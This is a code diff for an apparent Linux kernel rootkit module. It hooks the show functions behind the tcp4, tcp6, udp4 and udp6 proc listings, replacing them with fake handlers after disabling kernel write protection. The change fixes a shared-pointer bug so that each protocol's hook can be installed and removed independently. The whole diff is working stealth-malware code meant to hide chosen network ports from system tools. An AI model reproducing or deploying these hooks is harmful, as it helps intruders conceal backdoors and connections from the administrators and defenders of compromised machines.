@@ -17,7 +17,10 @@ MODULE_PARM_DESC(udp4, "udp4 port.");
 MODULE_PARM_DESC(udp6, "udp6 port.");
 
 
-unsigned long * seq_show_addr;
+unsigned long * seq_show_addr_tcp4;
+unsigned long * seq_show_addr_tcp6;
+unsigned long * seq_show_addr_udp4;
+unsigned long * seq_show_addr_udp6;
 
 int (*real_seq_show_tcp4)(struct seq_file *seq, void *v);
 int (*real_seq_show_tcp6)(struct seq_file *seq, void *v);
@@ -109,9 +112,9 @@ void hook_show_tcp4(void) {
     test = (struct seq_file*) filp->private_data;
     real_seq_show_tcp4 = test->op->show;
 
-    seq_show_addr = (unsigned long*)&test->op->show;
+    seq_show_addr_tcp4 = (unsigned long*)&test->op->show;
     unprotect_memory();
-    *seq_show_addr = (unsigned long)fake_seq_show_tcp4;
+    *seq_show_addr_tcp4 = (unsigned long)fake_seq_show_tcp4;
     protect_memory();
 }
 
@@ -123,9 +126,9 @@ void hook_show_tcp6(void) {
     test = (struct seq_file*) filp->private_data;
     real_seq_show_tcp6 = test->op->show;
 
-    seq_show_addr = (unsigned long*)&test->op->show;
+    seq_show_addr_tcp6 = (unsigned long*)&test->op->show;
     unprotect_memory();
-    *seq_show_addr = (unsigned long)fake_seq_show_tcp6;
+    *seq_show_addr_tcp6 = (unsigned long)fake_seq_show_tcp6;
     protect_memory();
 }
 
@@ -137,9 +140,9 @@ void hook_show_udp4(void) {
     test = (struct seq_file*) filp->private_data;
     real_seq_show_udp4 = test->op->show;
 
-    seq_show_addr = (unsigned long*)&test->op->show;
+    seq_show_addr_udp4 = (unsigned long*)&test->op->show;
     unprotect_memory();
-    *seq_show_addr = (unsigned long)fake_seq_show_udp4;
+    *seq_show_addr_udp4 = (unsigned long)fake_seq_show_udp4;
     protect_memory();
 }
 
@@ -151,33 +154,33 @@ void hook_show_udp6(void) {
     test = (struct seq_file*) filp->private_data;
     real_seq_show_udp6 = test->op->show;
 
-    seq_show_addr = (unsigned long*)&test->op->show;
+    seq_show_addr_udp6 = (unsigned long*)&test->op->show;
     unprotect_memory();
-    *seq_show_addr = (unsigned long)fake_seq_show_udp6;
+    *seq_show_addr_udp6 = (unsigned long)fake_seq_show_udp6;
     protect_memory();
 }
 
 void hook_cleanup_tcp4(void) {
     unprotect_memory();
-    *seq_show_addr = (unsigned long)real_seq_show_tcp4;
+    *seq_show_addr_tcp4 = (unsigned long)real_seq_show_tcp4;
     protect_memory();
 }
 
 void hook_cleanup_tcp6(void) {
     unprotect_memory();
-    *seq_show_addr = (unsigned long)real_seq_show_tcp6;
+    *seq_show_addr_tcp6 = (unsigned long)real_seq_show_tcp6;
     protect_memory();
 }
 
 void hook_cleanup_udp4(void) {
     unprotect_memory();
-    *seq_show_addr = (unsigned long)real_seq_show_udp4;
+    *seq_show_addr_udp4 = (unsigned long)real_seq_show_udp4;
     protect_memory();
 }
 
 void hook_cleanup_udp6(void) {
     unprotect_memory();
-    *seq_show_addr = (unsigned long)real_seq_show_udp6;
+    *seq_show_addr_udp6 = (unsigned long)real_seq_show_udp6;
     protect_memory();
 }
 
